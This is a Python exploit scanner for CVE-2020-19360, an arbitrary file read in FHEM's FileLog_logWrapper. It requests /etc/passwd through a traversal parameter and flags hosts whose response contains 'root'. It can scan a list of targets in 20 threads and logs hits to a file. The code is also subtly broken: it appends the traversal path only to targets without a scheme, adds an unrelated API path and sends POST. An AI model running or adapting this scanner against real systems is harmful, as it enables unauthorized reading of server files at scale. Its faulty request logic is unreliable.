
# -*- coding: utf-8 -*-
import argparse
import re

import requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    test = """
  ______     _______     ____   ___ ____   ___        _  ___ _____  __    ___  
 / ___\ \   / / ____|   |___ \ / _ \___ \ / _ \      / |/ _ \___ / / /_  / _ \ 
| |    \ \ / /|  _| _____ __) | | | |__) | | | |_____| | (_) ||_ \| '_ \| | | |
| |___  \ V / | |__|_____/ __/| |_| / __/| |_| |_____| |\__, |__) | (_) | |_| |
 \____|  \_/  |_____|   |_____|\___/_____|\___/      |_|  /_/____/ \___/ \___/ 
                                                                               
                                            tag:  Fhem FileLog_logWrapper 任意文件读取漏洞 CVE-2020-19360                                      
                                                     @version: 1.0.0   @author: zl                                                                    


 """
    print(test)


def poc(target):
    if not re.match(r'^https?://', target):
        target = "http://" + target + "/fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text"

    url = target + "/api/v1/file/loadfile"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62"
    }
    try:
        res = requests.post(url=url, headers=headers,verify=False, timeout=10)
        if res.status_code == 200 and "root" in res.text:
            result = "[+]{} is vulnerable".format(target)
            print(result)
            with open("output.txt", "a") as f:
                f.write(result + "\n")
        else:
            result = "[-]{} is not vulnerable".format(target)
            print(result)
            print()
    except requests.exceptions.RequestException as e:
        print("error", str(e))
        return False

def main():
    parser = argparse.ArgumentParser(description='Fhem FileLog_logWrapper 任意文件读取漏洞 CVE-2020-19360')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as file:
            for url in file:
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(20)  # 20自己指定的线程数
        mp.map(poc, url_list)  # printNumber 函数 target 目标列表
        mp.close()
        mp.join()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
    banner()
